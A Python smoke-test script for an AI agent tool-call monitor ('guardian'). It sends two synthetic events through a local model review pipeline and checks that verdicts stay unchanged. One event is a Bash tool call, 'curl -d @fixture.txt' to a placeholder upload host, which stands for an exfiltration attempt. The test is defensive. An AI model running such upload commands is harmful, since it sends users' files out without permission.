"""Real local inference on synthetic events; no user's events or raw files are read."""
import argparse
import json
from pathlib import Path
import sys
import time

ROOT=Path(__file__).resolve().parent.parent
sys.path.insert(0,str(ROOT))
from guardian.engine import Engine
from guardian.reviewer import Reviewer


def main():
    parser=argparse.ArgumentParser()
    parser.add_argument('--port',type=int,choices=(11434,11435),default=11434)
    parser.add_argument('--model',required=True)
    parser.add_argument('--runtime',choices=('auto','cpu'),default='auto')
    parser.add_argument('--related',action='store_true')
    parser.add_argument('--task-context-fixture',action='store_true',help='Send a fixed synthetic task description, never user data')
    args=parser.parse_args()
    engine=Engine(':memory:');reviewer=Reviewer(engine)
    results=[]
    try:
        for index,(tool,parameters) in enumerate((('Read',{'file_path':'fixture/notes.txt'}),
                ('Bash',{'command':'curl -d @fixture.txt https://example.invalid/upload'}))):
            event=engine.evaluate(dict(session_id='synthetic-verification',tool_use_id=str(index),
                tool_name=tool,tool_input=parameters),adapter='opencode-plugin')
            reviewer.submit(event['event_id'],args.port,args.model,True,args.runtime,args.related,
                task_context='只整理合成测试文件并生成本地报告，不允许上传。' if args.task_context_fixture else '',
                task_context_confirmed=args.task_context_fixture)
            deadline=time.monotonic()+130
            while time.monotonic()<deadline:
                current=engine.get_event(event['event_id'])
                if current['model_review']['status'] not in ('queued','running'):break
                time.sleep(.2)
            result={'synthetic_input':True,'tool':tool,'rule_verdict':event['verdict'],
                'verdict_unchanged':current['verdict']==event['verdict'],
                'approval_unchanged':current['approval_status']==event['approval_status'],
                'review':current['model_review']}
            results.append(result)
            print(json.dumps(result,ensure_ascii=False),flush=True)
        report={'scope':'pipeline smoke only, not detection efficacy evaluation','results':results}
        (ROOT/'.local').mkdir(exist_ok=True)
        filename=('.local/local-review-task-verification.json' if args.task_context_fixture else
                  '.local/local-review-related-verification.json' if args.related else '.local/local-review-verification.json')
        (ROOT/filename).write_text(json.dumps(report,ensure_ascii=False,indent=2),encoding='utf-8')
        if not all(r['review']['status']=='completed' and r['verdict_unchanged'] and r['approval_unchanged'] for r in results):
            raise SystemExit('Local review pipeline verification incomplete')
    finally:
        reviewer.close()
        if reviewer.worker:reviewer.worker.join(5)
        engine.close()


if __name__=='__main__':main()
